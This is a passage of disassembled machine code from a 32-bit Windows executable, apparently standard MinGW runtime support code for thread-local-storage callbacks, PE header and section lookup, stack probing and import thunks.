  401f2e:	66 90                	xchg   %ax,%ax
  401f30:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  401f37:	00 
  401f38:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
  401f3f:	e8 58 06 00 00       	call   0x40259c
  401f44:	e9 61 ff ff ff       	jmp    0x401eaa
  401f49:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401f50:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  401f57:	00 
  401f58:	c7 04 24 0b 00 00 00 	movl   $0xb,(%esp)
  401f5f:	e8 38 06 00 00       	call   0x40259c
  401f64:	e9 41 ff ff ff       	jmp    0x401eaa
  401f69:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401f70:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  401f77:	00 
  401f78:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  401f7f:	e8 18 06 00 00       	call   0x40259c
  401f84:	e9 21 ff ff ff       	jmp    0x401eaa
  401f89:	90                   	nop
  401f8a:	90                   	nop
  401f8b:	90                   	nop
  401f8c:	90                   	nop
  401f8d:	90                   	nop
  401f8e:	90                   	nop
  401f8f:	90                   	nop
  401f90:	55                   	push   %ebp
  401f91:	57                   	push   %edi
  401f92:	56                   	push   %esi
  401f93:	53                   	push   %ebx
  401f94:	83 ec 1c             	sub    $0x1c,%esp
  401f97:	c7 04 24 f8 53 40 00 	movl   $0x4053f8,(%esp)
  401f9e:	ff 15 2c 61 40 00    	call   *0x40612c
  401fa4:	8b 1d f0 53 40 00    	mov    0x4053f0,%ebx
  401faa:	83 ec 04             	sub    $0x4,%esp
  401fad:	8b 2d 64 61 40 00    	mov    0x406164,%ebp
  401fb3:	8b 3d 3c 61 40 00    	mov    0x40613c,%edi
  401fb9:	85 db                	test   %ebx,%ebx
  401fbb:	74 28                	je     0x401fe5
  401fbd:	8d 76 00             	lea    0x0(%esi),%esi
  401fc0:	8b 03                	mov    (%ebx),%eax
  401fc2:	89 04 24             	mov    %eax,(%esp)
  401fc5:	ff d5                	call   *%ebp
  401fc7:	83 ec 04             	sub    $0x4,%esp
  401fca:	89 c6                	mov    %eax,%esi
  401fcc:	ff d7                	call   *%edi
  401fce:	85 c0                	test   %eax,%eax
  401fd0:	75 0c                	jne    0x401fde
  401fd2:	85 f6                	test   %esi,%esi
  401fd4:	74 08                	je     0x401fde
  401fd6:	8b 43 04             	mov    0x4(%ebx),%eax
  401fd9:	89 34 24             	mov    %esi,(%esp)
  401fdc:	ff d0                	call   *%eax
  401fde:	8b 5b 08             	mov    0x8(%ebx),%ebx
  401fe1:	85 db                	test   %ebx,%ebx
  401fe3:	75 db                	jne    0x401fc0
  401fe5:	c7 04 24 f8 53 40 00 	movl   $0x4053f8,(%esp)
  401fec:	ff 15 50 61 40 00    	call   *0x406150
  401ff2:	83 ec 04             	sub    $0x4,%esp
  401ff5:	83 c4 1c             	add    $0x1c,%esp
  401ff8:	5b                   	pop    %ebx
  401ff9:	5e                   	pop    %esi
  401ffa:	5f                   	pop    %edi
  401ffb:	5d                   	pop    %ebp
  401ffc:	c3                   	ret
  401ffd:	8d 76 00             	lea    0x0(%esi),%esi
  402000:	a1 f4 53 40 00       	mov    0x4053f4,%eax
  402005:	85 c0                	test   %eax,%eax
  402007:	75 07                	jne    0x402010
  402009:	c3                   	ret
  40200a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402010:	53                   	push   %ebx
  402011:	83 ec 18             	sub    $0x18,%esp
  402014:	c7 44 24 04 0c 00 00 	movl   $0xc,0x4(%esp)
  40201b:	00 
  40201c:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  402023:	e8 ac 05 00 00       	call   0x4025d4
  402028:	85 c0                	test   %eax,%eax
  40202a:	89 c3                	mov    %eax,%ebx
  40202c:	74 42                	je     0x402070
  40202e:	8b 44 24 20          	mov    0x20(%esp),%eax
  402032:	c7 04 24 f8 53 40 00 	movl   $0x4053f8,(%esp)
  402039:	89 03                	mov    %eax,(%ebx)
  40203b:	8b 44 24 24          	mov    0x24(%esp),%eax
  40203f:	89 43 04             	mov    %eax,0x4(%ebx)
  402042:	ff 15 2c 61 40 00    	call   *0x40612c
  402048:	a1 f0 53 40 00       	mov    0x4053f0,%eax
  40204d:	83 ec 04             	sub    $0x4,%esp
  402050:	89 1d f0 53 40 00    	mov    %ebx,0x4053f0
  402056:	c7 04 24 f8 53 40 00 	movl   $0x4053f8,(%esp)
  40205d:	89 43 08             	mov    %eax,0x8(%ebx)
  402060:	ff 15 50 61 40 00    	call   *0x406150
  402066:	31 c0                	xor    %eax,%eax
  402068:	83 ec 04             	sub    $0x4,%esp
  40206b:	83 c4 18             	add    $0x18,%esp
  40206e:	5b                   	pop    %ebx
  40206f:	c3                   	ret
  402070:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402075:	eb f4                	jmp    0x40206b
  402077:	89 f6                	mov    %esi,%esi
  402079:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402080:	53                   	push   %ebx
  402081:	83 ec 18             	sub    $0x18,%esp
  402084:	a1 f4 53 40 00       	mov    0x4053f4,%eax
  402089:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  40208d:	85 c0                	test   %eax,%eax
  40208f:	75 0f                	jne    0x4020a0
  402091:	83 c4 18             	add    $0x18,%esp
  402094:	31 c0                	xor    %eax,%eax
  402096:	5b                   	pop    %ebx
  402097:	c3                   	ret
  402098:	90                   	nop
  402099:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4020a0:	c7 04 24 f8 53 40 00 	movl   $0x4053f8,(%esp)
  4020a7:	ff 15 2c 61 40 00    	call   *0x40612c
  4020ad:	8b 15 f0 53 40 00    	mov    0x4053f0,%edx
  4020b3:	83 ec 04             	sub    $0x4,%esp
  4020b6:	85 d2                	test   %edx,%edx
  4020b8:	74 17                	je     0x4020d1
  4020ba:	8b 02                	mov    (%edx),%eax
  4020bc:	39 d8                	cmp    %ebx,%eax
  4020be:	75 0a                	jne    0x4020ca
  4020c0:	eb 4e                	jmp    0x402110
  4020c2:	8b 08                	mov    (%eax),%ecx
  4020c4:	39 d9                	cmp    %ebx,%ecx
  4020c6:	74 28                	je     0x4020f0
  4020c8:	89 c2                	mov    %eax,%edx
  4020ca:	8b 42 08             	mov    0x8(%edx),%eax
  4020cd:	85 c0                	test   %eax,%eax
  4020cf:	75 f1                	jne    0x4020c2
  4020d1:	c7 04 24 f8 53 40 00 	movl   $0x4053f8,(%esp)
  4020d8:	ff 15 50 61 40 00    	call   *0x406150
  4020de:	83 ec 04             	sub    $0x4,%esp
  4020e1:	83 c4 18             	add    $0x18,%esp
  4020e4:	31 c0                	xor    %eax,%eax
  4020e6:	5b                   	pop    %ebx
  4020e7:	c3                   	ret
  4020e8:	90                   	nop
  4020e9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4020f0:	8b 48 08             	mov    0x8(%eax),%ecx
  4020f3:	89 4a 08             	mov    %ecx,0x8(%edx)
  4020f6:	89 04 24             	mov    %eax,(%esp)
  4020f9:	e8 be 04 00 00       	call   0x4025bc
  4020fe:	c7 04 24 f8 53 40 00 	movl   $0x4053f8,(%esp)
  402105:	ff 15 50 61 40 00    	call   *0x406150
  40210b:	83 ec 04             	sub    $0x4,%esp
  40210e:	eb d1                	jmp    0x4020e1
  402110:	89 d0                	mov    %edx,%eax
  402112:	8b 52 08             	mov    0x8(%edx),%edx
  402115:	89 15 f0 53 40 00    	mov    %edx,0x4053f0
  40211b:	eb d9                	jmp    0x4020f6
  40211d:	8d 76 00             	lea    0x0(%esi),%esi
  402120:	53                   	push   %ebx
  402121:	83 ec 18             	sub    $0x18,%esp
  402124:	8b 44 24 24          	mov    0x24(%esp),%eax
  402128:	83 f8 01             	cmp    $0x1,%eax
  40212b:	0f 84 8f 00 00 00    	je     0x4021c0
  402131:	72 2d                	jb     0x402160
  402133:	83 f8 02             	cmp    $0x2,%eax
  402136:	74 18                	je     0x402150
  402138:	83 f8 03             	cmp    $0x3,%eax
  40213b:	75 18                	jne    0x402155
  40213d:	a1 f4 53 40 00       	mov    0x4053f4,%eax
  402142:	85 c0                	test   %eax,%eax
  402144:	74 0f                	je     0x402155
  402146:	e8 45 fe ff ff       	call   0x401f90
  40214b:	eb 08                	jmp    0x402155
  40214d:	8d 76 00             	lea    0x0(%esi),%esi
  402150:	e8 5b f8 ff ff       	call   0x4019b0
  402155:	83 c4 18             	add    $0x18,%esp
  402158:	b8 01 00 00 00       	mov    $0x1,%eax
  40215d:	5b                   	pop    %ebx
  40215e:	c3                   	ret
  40215f:	90                   	nop
  402160:	a1 f4 53 40 00       	mov    0x4053f4,%eax
  402165:	85 c0                	test   %eax,%eax
  402167:	0f 85 85 00 00 00    	jne    0x4021f2
  40216d:	a1 f4 53 40 00       	mov    0x4053f4,%eax
  402172:	83 f8 01             	cmp    $0x1,%eax
  402175:	75 de                	jne    0x402155
  402177:	a1 f0 53 40 00       	mov    0x4053f0,%eax
  40217c:	85 c0                	test   %eax,%eax
  40217e:	74 11                	je     0x402191
  402180:	8b 58 08             	mov    0x8(%eax),%ebx
  402183:	89 04 24             	mov    %eax,(%esp)
  402186:	e8 31 04 00 00       	call   0x4025bc
  40218b:	85 db                	test   %ebx,%ebx
  40218d:	89 d8                	mov    %ebx,%eax
  40218f:	75 ef                	jne    0x402180
  402191:	c7 05 f0 53 40 00 00 	movl   $0x0,0x4053f0
  402198:	00 00 00 
  40219b:	c7 05 f4 53 40 00 00 	movl   $0x0,0x4053f4
  4021a2:	00 00 00 
  4021a5:	c7 04 24 f8 53 40 00 	movl   $0x4053f8,(%esp)
  4021ac:	ff 15 28 61 40 00    	call   *0x406128
  4021b2:	83 ec 04             	sub    $0x4,%esp
  4021b5:	eb 9e                	jmp    0x402155
  4021b7:	89 f6                	mov    %esi,%esi
  4021b9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4021c0:	a1 f4 53 40 00       	mov    0x4053f4,%eax
  4021c5:	85 c0                	test   %eax,%eax
  4021c7:	74 17                	je     0x4021e0
  4021c9:	c7 05 f4 53 40 00 01 	movl   $0x1,0x4053f4
  4021d0:	00 00 00 
  4021d3:	83 c4 18             	add    $0x18,%esp
  4021d6:	b8 01 00 00 00       	mov    $0x1,%eax
  4021db:	5b                   	pop    %ebx
  4021dc:	c3                   	ret
  4021dd:	8d 76 00             	lea    0x0(%esi),%esi
  4021e0:	c7 04 24 f8 53 40 00 	movl   $0x4053f8,(%esp)
  4021e7:	ff 15 4c 61 40 00    	call   *0x40614c
  4021ed:	83 ec 04             	sub    $0x4,%esp
  4021f0:	eb d7                	jmp    0x4021c9
  4021f2:	e8 99 fd ff ff       	call   0x401f90
  4021f7:	e9 71 ff ff ff       	jmp    0x40216d
  4021fc:	90                   	nop
  4021fd:	90                   	nop
  4021fe:	90                   	nop
  4021ff:	90                   	nop
  402200:	03 40 3c             	add    0x3c(%eax),%eax
  402203:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  402209:	74 05                	je     0x402210
  40220b:	31 c0                	xor    %eax,%eax
  40220d:	c3                   	ret
  40220e:	66 90                	xchg   %ax,%ax
  402210:	66 81 78 18 0b 01    	cmpw   $0x10b,0x18(%eax)
  402216:	0f 94 c0             	sete   %al
  402219:	0f b6 c0             	movzbl %al,%eax
  40221c:	c3                   	ret
  40221d:	8d 76 00             	lea    0x0(%esi),%esi
  402220:	8b 44 24 04          	mov    0x4(%esp),%eax
  402224:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%eax)
  402229:	74 05                	je     0x402230
  40222b:	31 c0                	xor    %eax,%eax
  40222d:	c3                   	ret
  40222e:	66 90                	xchg   %ax,%ax
  402230:	eb ce                	jmp    0x402200
  402232:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402239:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402240:	56                   	push   %esi
  402241:	53                   	push   %ebx
  402242:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402246:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  40224a:	03 52 3c             	add    0x3c(%edx),%edx
  40224d:	0f b7 72 06          	movzwl 0x6(%edx),%esi
  402251:	0f b7 42 14          	movzwl 0x14(%edx),%eax
  402255:	85 f6                	test   %esi,%esi
  402257:	8d 44 02 18          	lea    0x18(%edx,%eax,1),%eax
  40225b:	74 1b                	je     0x402278
  40225d:	31 c9                	xor    %ecx,%ecx
  40225f:	90                   	nop
  402260:	8b 50 0c             	mov    0xc(%eax),%edx
  402263:	39 da                	cmp    %ebx,%edx
  402265:	77 07                	ja     0x40226e
  402267:	03 50 08             	add    0x8(%eax),%edx
  40226a:	39 d3                	cmp    %edx,%ebx
  40226c:	72 0c                	jb     0x40227a
  40226e:	83 c1 01             	add    $0x1,%ecx
  402271:	83 c0 28             	add    $0x28,%eax
  402274:	39 f1                	cmp    %esi,%ecx
  402276:	75 e8                	jne    0x402260
  402278:	31 c0                	xor    %eax,%eax
  40227a:	5b                   	pop    %ebx
  40227b:	5e                   	pop    %esi
  40227c:	c3                   	ret
  40227d:	8d 76 00             	lea    0x0(%esi),%esi
  402280:	55                   	push   %ebp
  402281:	57                   	push   %edi
  402282:	56                   	push   %esi
  402283:	53                   	push   %ebx
  402284:	31 f6                	xor    %esi,%esi
  402286:	83 ec 1c             	sub    $0x1c,%esp
  402289:	8b 7c 24 30          	mov    0x30(%esp),%edi
  40228d:	89 3c 24             	mov    %edi,(%esp)
  402290:	e8 ff 02 00 00       	call   0x402594
  402295:	83 f8 08             	cmp    $0x8,%eax
  402298:	77 0b                	ja     0x4022a5
  40229a:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  4022a1:	4d 5a 
  4022a3:	74 0b                	je     0x4022b0
  4022a5:	83 c4 1c             	add    $0x1c,%esp
  4022a8:	89 f0                	mov    %esi,%eax
  4022aa:	5b                   	pop    %ebx
  4022ab:	5e                   	pop    %esi
  4022ac:	5f                   	pop    %edi
  4022ad:	5d                   	pop    %ebp
  4022ae:	c3                   	ret
  4022af:	90                   	nop
  4022b0:	b8 00 00 40 00       	mov    $0x400000,%eax
  4022b5:	e8 46 ff ff ff       	call   0x402200
  4022ba:	85 c0                	test   %eax,%eax
  4022bc:	74 e7                	je     0x4022a5
  4022be:	a1 3c 00 40 00       	mov    0x40003c,%eax
  4022c3:	8d 90 00 00 40 00    	lea    0x400000(%eax),%edx
  4022c9:	0f b7 80 14 00 40 00 	movzwl 0x400014(%eax),%eax
  4022d0:	0f b7 6a 06          	movzwl 0x6(%edx),%ebp
  4022d4:	8d 5c 02 18          	lea    0x18(%edx,%eax,1),%ebx
  4022d8:	85 ed                	test   %ebp,%ebp
  4022da:	75 0e                	jne    0x4022ea
  4022dc:	eb c7                	jmp    0x4022a5
  4022de:	66 90                	xchg   %ax,%ax
  4022e0:	83 c6 01             	add    $0x1,%esi
  4022e3:	83 c3 28             	add    $0x28,%ebx
  4022e6:	39 ee                	cmp    %ebp,%esi
  4022e8:	74 26                	je     0x402310
  4022ea:	c7 44 24 08 08 00 00 	movl   $0x8,0x8(%esp)
  4022f1:	00 
  4022f2:	89 7c 24 04          	mov    %edi,0x4(%esp)
  4022f6:	89 1c 24             	mov    %ebx,(%esp)
  4022f9:	e8 8e 02 00 00       	call   0x40258c
  4022fe:	85 c0                	test   %eax,%eax
  402300:	75 de                	jne    0x4022e0
  402302:	83 c4 1c             	add    $0x1c,%esp
  402305:	89 de                	mov    %ebx,%esi
  402307:	89 f0                	mov    %esi,%eax
  402309:	5b                   	pop    %ebx
  40230a:	5e                   	pop    %esi
  40230b:	5f                   	pop    %edi
  40230c:	5d                   	pop    %ebp
  40230d:	c3                   	ret
  40230e:	66 90                	xchg   %ax,%ax
  402310:	83 c4 1c             	add    $0x1c,%esp
  402313:	31 f6                	xor    %esi,%esi
  402315:	5b                   	pop    %ebx
  402316:	89 f0                	mov    %esi,%eax
  402318:	5e                   	pop    %esi
  402319:	5f                   	pop    %edi
  40231a:	5d                   	pop    %ebp
  40231b:	c3                   	ret
  40231c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402320:	53                   	push   %ebx
  402321:	31 db                	xor    %ebx,%ebx
  402323:	83 ec 08             	sub    $0x8,%esp
  402326:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40232d:	4d 5a 
  40232f:	74 0f                	je     0x402340
  402331:	83 c4 08             	add    $0x8,%esp
  402334:	89 d8                	mov    %ebx,%eax
  402336:	5b                   	pop    %ebx
  402337:	c3                   	ret
  402338:	90                   	nop
  402339:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402340:	b8 00 00 40 00       	mov    $0x400000,%eax
  402345:	e8 b6 fe ff ff       	call   0x402200
  40234a:	85 c0                	test   %eax,%eax
  40234c:	74 e3                	je     0x402331
  40234e:	8b 44 24 10          	mov    0x10(%esp),%eax
  402352:	c7 04 24 00 00 40 00 	movl   $0x400000,(%esp)
  402359:	2d 00 00 40 00       	sub    $0x400000,%eax
  40235e:	89 44 24 04          	mov    %eax,0x4(%esp)
  402362:	e8 d9 fe ff ff       	call   0x402240
  402367:	83 c4 08             	add    $0x8,%esp
  40236a:	89 c3                	mov    %eax,%ebx
  40236c:	89 d8                	mov    %ebx,%eax
  40236e:	5b                   	pop    %ebx
  40236f:	c3                   	ret
  402370:	31 c0                	xor    %eax,%eax
  402372:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  402379:	4d 5a 
  40237b:	74 03                	je     0x402380
  40237d:	f3 c3                	repz ret
  40237f:	90                   	nop
  402380:	b8 00 00 40 00       	mov    $0x400000,%eax
  402385:	e8 76 fe ff ff       	call   0x402200
  40238a:	85 c0                	test   %eax,%eax
  40238c:	74 ef                	je     0x40237d
  40238e:	a1 3c 00 40 00       	mov    0x40003c,%eax
  402393:	0f b7 80 06 00 40 00 	movzwl 0x400006(%eax),%eax
  40239a:	c3                   	ret
  40239b:	90                   	nop
  40239c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4023a0:	56                   	push   %esi
  4023a1:	31 f6                	xor    %esi,%esi
  4023a3:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  4023aa:	4d 5a 
  4023ac:	53                   	push   %ebx
  4023ad:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  4023b1:	74 0d                	je     0x4023c0
  4023b3:	89 f0                	mov    %esi,%eax
  4023b5:	5b                   	pop    %ebx
  4023b6:	5e                   	pop    %esi
  4023b7:	c3                   	ret
  4023b8:	90                   	nop
  4023b9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4023c0:	b8 00 00 40 00       	mov    $0x400000,%eax
  4023c5:	e8 36 fe ff ff       	call   0x402200
  4023ca:	85 c0                	test   %eax,%eax
  4023cc:	74 e5                	je     0x4023b3
  4023ce:	a1 3c 00 40 00       	mov    0x40003c,%eax
  4023d3:	8d 88 00 00 40 00    	lea    0x400000(%eax),%ecx
  4023d9:	0f b7 80 14 00 40 00 	movzwl 0x400014(%eax),%eax
  4023e0:	8d 54 01 18          	lea    0x18(%ecx,%eax,1),%edx
  4023e4:	0f b7 49 06          	movzwl 0x6(%ecx),%ecx
  4023e8:	85 c9                	test   %ecx,%ecx
  4023ea:	74 c7                	je     0x4023b3
  4023ec:	31 c0                	xor    %eax,%eax
  4023ee:	66 90                	xchg   %ax,%ax
  4023f0:	f6 42 27 20          	testb  $0x20,0x27(%edx)
  4023f4:	74 07                	je     0x4023fd
  4023f6:	85 db                	test   %ebx,%ebx
  4023f8:	74 16                	je     0x402410
  4023fa:	83 eb 01             	sub    $0x1,%ebx
  4023fd:	83 c0 01             	add    $0x1,%eax
  402400:	83 c2 28             	add    $0x28,%edx
  402403:	39 c8                	cmp    %ecx,%eax
  402405:	75 e9                	jne    0x4023f0
  402407:	31 f6                	xor    %esi,%esi
  402409:	89 f0                	mov    %esi,%eax
  40240b:	5b                   	pop    %ebx
  40240c:	5e                   	pop    %esi
  40240d:	c3                   	ret
  40240e:	66 90                	xchg   %ax,%ax
  402410:	89 d6                	mov    %edx,%esi
  402412:	89 f0                	mov    %esi,%eax
  402414:	5b                   	pop    %ebx
  402415:	5e                   	pop    %esi
  402416:	c3                   	ret
  402417:	89 f6                	mov    %esi,%esi
  402419:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402420:	53                   	push   %ebx
  402421:	31 db                	xor    %ebx,%ebx
  402423:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40242a:	4d 5a 
  40242c:	74 04                	je     0x402432
  40242e:	89 d8                	mov    %ebx,%eax
  402430:	5b                   	pop    %ebx
  402431:	c3                   	ret
  402432:	b8 00 00 40 00       	mov    $0x400000,%eax
  402437:	e8 c4 fd ff ff       	call   0x402200
  40243c:	85 c0                	test   %eax,%eax
  40243e:	b8 00 00 40 00       	mov    $0x400000,%eax
  402443:	0f 45 d8             	cmovne %eax,%ebx
  402446:	89 d8                	mov    %ebx,%eax
  402448:	5b                   	pop    %ebx
  402449:	c3                   	ret
  40244a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402450:	31 c0                	xor    %eax,%eax
  402452:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  402459:	4d 5a 
  40245b:	74 03                	je     0x402460
  40245d:	c3                   	ret
  40245e:	66 90                	xchg   %ax,%ax
  402460:	83 ec 08             	sub    $0x8,%esp
  402463:	b8 00 00 40 00       	mov    $0x400000,%eax
  402468:	e8 93 fd ff ff       	call   0x402200
  40246d:	85 c0                	test   %eax,%eax
  40246f:	74 25                	je     0x402496
  402471:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402475:	c7 04 24 00 00 40 00 	movl   $0x400000,(%esp)
  40247c:	2d 00 00 40 00       	sub    $0x400000,%eax
  402481:	89 44 24 04          	mov    %eax,0x4(%esp)
  402485:	e8 b6 fd ff ff       	call   0x402240
  40248a:	85 c0                	test   %eax,%eax
  40248c:	74 12                	je     0x4024a0
  40248e:	8b 40 24             	mov    0x24(%eax),%eax
  402491:	f7 d0                	not    %eax
  402493:	c1 e8 1f             	shr    $0x1f,%eax
  402496:	83 c4 08             	add    $0x8,%esp
  402499:	c3                   	ret
  40249a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4024a0:	31 c0                	xor    %eax,%eax
  4024a2:	eb f2                	jmp    0x402496
  4024a4:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4024aa:	8d bf 00 00 00 00    	lea    0x0(%edi),%edi
  4024b0:	57                   	push   %edi
  4024b1:	56                   	push   %esi
  4024b2:	31 ff                	xor    %edi,%edi
  4024b4:	53                   	push   %ebx
  4024b5:	83 ec 08             	sub    $0x8,%esp
  4024b8:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  4024bf:	4d 5a 
  4024c1:	8b 74 24 18          	mov    0x18(%esp),%esi
  4024c5:	74 09                	je     0x4024d0
  4024c7:	83 c4 08             	add    $0x8,%esp
  4024ca:	89 f8                	mov    %edi,%eax
  4024cc:	5b                   	pop    %ebx
  4024cd:	5e                   	pop    %esi
  4024ce:	5f                   	pop    %edi
  4024cf:	c3                   	ret
  4024d0:	b8 00 00 40 00       	mov    $0x400000,%eax
  4024d5:	e8 26 fd ff ff       	call   0x402200
  4024da:	85 c0                	test   %eax,%eax
  4024dc:	74 e9                	je     0x4024c7
  4024de:	a1 3c 00 40 00       	mov    0x40003c,%eax
  4024e3:	8b 98 80 00 40 00    	mov    0x400080(%eax),%ebx
  4024e9:	85 db                	test   %ebx,%ebx
  4024eb:	74 da                	je     0x4024c7
  4024ed:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4024f1:	c7 04 24 00 00 40 00 	movl   $0x400000,(%esp)
  4024f8:	e8 43 fd ff ff       	call   0x402240
  4024fd:	85 c0                	test   %eax,%eax
  4024ff:	74 c6                	je     0x4024c7
  402501:	81 c3 00 00 40 00    	add    $0x400000,%ebx
  402507:	89 da                	mov    %ebx,%edx
  402509:	75 0b                	jne    0x402516
  40250b:	eb ba                	jmp    0x4024c7
  40250d:	8d 76 00             	lea    0x0(%esi),%esi
  402510:	83 ee 01             	sub    $0x1,%esi
  402513:	83 c2 14             	add    $0x14,%edx
  402516:	8b 4a 04             	mov    0x4(%edx),%ecx
  402519:	85 c9                	test   %ecx,%ecx
  40251b:	75 07                	jne    0x402524
  40251d:	8b 42 0c             	mov    0xc(%edx),%eax
  402520:	85 c0                	test   %eax,%eax
  402522:	74 1c                	je     0x402540
  402524:	85 f6                	test   %esi,%esi
  402526:	7f e8                	jg     0x402510
  402528:	8b 7a 0c             	mov    0xc(%edx),%edi
  40252b:	83 c4 08             	add    $0x8,%esp
  40252e:	5b                   	pop    %ebx
  40252f:	5e                   	pop    %esi
  402530:	81 c7 00 00 40 00    	add    $0x400000,%edi
  402536:	89 f8                	mov    %edi,%eax
  402538:	5f                   	pop    %edi
  402539:	c3                   	ret
  40253a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402540:	83 c4 08             	add    $0x8,%esp
  402543:	31 ff                	xor    %edi,%edi
  402545:	89 f8                	mov    %edi,%eax
  402547:	5b                   	pop    %ebx
  402548:	5e                   	pop    %esi
  402549:	5f                   	pop    %edi
  40254a:	c3                   	ret
  40254b:	90                   	nop
  40254c:	90                   	nop
  40254d:	90                   	nop
  40254e:	90                   	nop
  40254f:	90                   	nop
  402550:	51                   	push   %ecx
  402551:	50                   	push   %eax
  402552:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402557:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40255b:	72 15                	jb     0x402572
  40255d:	81 e9 00 10 00 00    	sub    $0x1000,%ecx
  402563:	83 09 00             	orl    $0x0,(%ecx)
  402566:	2d 00 10 00 00       	sub    $0x1000,%eax
  40256b:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402570:	77 eb                	ja     0x40255d
  402572:	29 c1                	sub    %eax,%ecx
  402574:	83 09 00             	orl    $0x0,(%ecx)
  402577:	58                   	pop    %eax
  402578:	59                   	pop    %ecx
  402579:	c3                   	ret
  40257a:	90                   	nop
  40257b:	90                   	nop
  40257c:	ff 25 e0 61 40 00    	jmp    *0x4061e0
  402582:	90                   	nop
  402583:	90                   	nop
  402584:	ff 25 dc 61 40 00    	jmp    *0x4061dc
  40258a:	90                   	nop
  40258b:	90                   	nop
  40258c:	ff 25 d8 61 40 00    	jmp    *0x4061d8
  402592:	90                   	nop
  402593:	90                   	nop
  402594:	ff 25 d4 61 40 00    	jmp    *0x4061d4
  40259a:	90                   	nop
  40259b:	90                   	nop
  40259c:	ff 25 d0 61 40 00    	jmp    *0x4061d0
  4025a2:	90                   	nop
  4025a3:	90                   	nop
  4025a4:	ff 25 cc 61 40 00    	jmp    *0x4061cc
  4025aa:	90                   	nop
  4025ab:	90                   	nop
  4025ac:	ff 25 c8 61 40 00    	jmp    *0x4061c8
  4025b2:	90                   	nop
  4025b3:	90                   	nop
  4025b4:	ff 25 c4 61 40 00    	jmp    *0x4061c4
  4025ba:	90                   	nop
  4025bb:	90                   	nop
  4025bc:	ff 25 c0 61 40 00    	jmp    *0x4061c0
  4025c2:	90                   	nop
  4025c3:	90                   	nop
  4025c4:	ff 25 bc 61 40 00    	jmp    *0x4061bc
  4025ca:	90                   	nop
  4025cb:	90                   	nop
  4025cc:	ff 25 b8 61 40 00    	jmp    *0x4061b8
  4025d2:	90                   	nop
  4025d3:	90                   	nop
  4025d4:	ff 25 b4 61 40 00    	jmp    *0x4061b4
  4025da:	90                   	nop
  4025db:	90                   	nop
  4025dc:	ff 25 b0 61 40 00    	jmp    *0x4061b0
  4025e2:	90                   	nop
  4025e3:	90                   	nop
  4025e4:	ff 25 a8 61 40 00    	jmp    *0x4061a8
  4025ea:	90                   	nop
  4025eb:	90                   	nop
  4025ec:	ff 25 a0 61 40 00    	jmp    *0x4061a0
  4025f2:	90                   	nop
  4025f3:	90                   	nop
  4025f4:	ff 25 98 61 40 00    	jmp    *0x406198
  4025fa:	90                   	nop
  4025fb:	90                   	nop
  4025fc:	ff 25 94 61 40 00    	jmp    *0x406194
  402602:	90                   	nop
  402603:	90                   	nop
  402604:	ff 25 8c 61 40 00    	jmp    *0x40618c
  40260a:	90                   	nop
  40260b:	90                   	nop
  40260c:	ff 25 88 61 40 00    	jmp    *0x406188
  402612:	90                   	nop
  402613:	90                   	nop
  402614:	ff 25 7c 61 40 00    	jmp    *0x40617c
  40261a:	90                   	nop
  40261b:	90                   	nop
  40261c:	ff 25 78 61 40 00    	jmp    *0x406178
  402622:	90                   	nop
  402623:	90                   	nop
  402624:	66 90                	xchg   %ax,%ax
  402626:	66 90                	xchg   %ax,%ax
  402628:	66 90                	xchg   %ax,%ax
  40262a:	66 90                	xchg   %ax,%ax
  40262c:	66 90                	xchg   %ax,%ax
  40262e:	66 90                	xchg   %ax,%ax
  402630:	a1 10 54 40 00       	mov    0x405410,%eax
  402635:	c3                   	ret
  402636:	8d 76 00             	lea    0x0(%esi),%esi
  402639:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402640:	8b 44 24 04          	mov    0x4(%esp),%eax
  402644:	87 05 10 54 40 00    	xchg   %eax,0x405410
  40264a:	c3                   	ret
  40264b:	90                   	nop
  40264c:	90                   	nop
  40264d:	90                   	nop
  40264e:	90                   	nop
  40264f:	90                   	nop
